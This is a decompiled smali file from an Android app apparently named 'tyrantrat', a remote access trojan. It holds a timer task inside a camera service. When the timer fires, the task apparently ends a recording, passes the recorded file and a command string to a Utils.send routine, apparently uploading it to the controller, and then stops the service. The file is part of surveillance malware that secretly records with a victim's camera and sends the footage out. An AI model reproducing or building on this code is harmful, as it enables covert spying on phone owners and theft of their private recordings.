.class Lcom/shaktibiplabDev/tyrantrat/CamService$100000000;
.super Ljava/util/TimerTask;
.source "CamService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/shaktibiplabDev/tyrantrat/CamService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/shaktibiplabDev/tyrantrat/CamService;


# direct methods
.method constructor <init>(Lcom/shaktibiplabDev/tyrantrat/CamService;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/util/TimerTask;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/shaktibiplabDev/tyrantrat/CamService$100000000;->this$0:Lcom/shaktibiplabDev/tyrantrat/CamService;

    return-void
.end method

.method static access$0(Lcom/shaktibiplabDev/tyrantrat/CamService$100000000;)Lcom/shaktibiplabDev/tyrantrat/CamService;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/shaktibiplabDev/tyrantrat/CamService$100000000;->this$0:Lcom/shaktibiplabDev/tyrantrat/CamService;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 157
    move-object v0, p0

    move-object v2, v0

    iget-object v2, v2, Lcom/shaktibiplabDev/tyrantrat/CamService$100000000;->this$0:Lcom/shaktibiplabDev/tyrantrat/CamService;

    invoke-static {v2}, Lcom/shaktibiplabDev/tyrantrat/CamService;->access$1000012(Lcom/shaktibiplabDev/tyrantrat/CamService;)V

    .line 159
    move-object v2, v0

    iget-object v2, v2, Lcom/shaktibiplabDev/tyrantrat/CamService$100000000;->this$0:Lcom/shaktibiplabDev/tyrantrat/CamService;

    iget-object v2, v2, Lcom/shaktibiplabDev/tyrantrat/CamService;->cmd:Ljava/lang/String;

    move-object v3, v0

    iget-object v3, v3, Lcom/shaktibiplabDev/tyrantrat/CamService$100000000;->this$0:Lcom/shaktibiplabDev/tyrantrat/CamService;

    iget-object v3, v3, Lcom/shaktibiplabDev/tyrantrat/CamService;->file:Ljava/io/File;

    invoke-static {v2, v3}, Lcom/util/extras/Utils;->send(Ljava/lang/String;Ljava/io/File;)Z

    move-result v2

    .line 160
    move-object v2, v0

    iget-object v2, v2, Lcom/shaktibiplabDev/tyrantrat/CamService$100000000;->this$0:Lcom/shaktibiplabDev/tyrantrat/CamService;

    invoke-virtual {v2}, Lcom/shaktibiplabDev/tyrantrat/CamService;->stopSelf()V

    .line 161
    const-string v2, "TAGG"

    const-string v3, "rec stopeed after sec"

    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    return-void
.end method
